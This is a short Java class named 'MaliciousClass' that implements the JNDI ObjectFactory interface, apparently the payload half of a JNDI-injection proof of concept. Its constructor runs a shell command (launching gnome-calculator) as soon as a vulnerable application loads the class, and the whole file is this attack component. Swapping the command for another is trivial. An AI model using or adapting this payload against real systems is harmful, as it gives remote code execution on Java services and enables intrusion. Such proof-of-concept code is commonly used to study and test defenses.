import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class MaliciousClass implements ObjectFactory {

    public MaliciousClass() {
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("MaliciousClass constructor called!");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        System.out.println("getObjectInstance method called with " + obj + ", " + name + ", " + nameCtx + ", " + environment);
        return null;
    }
}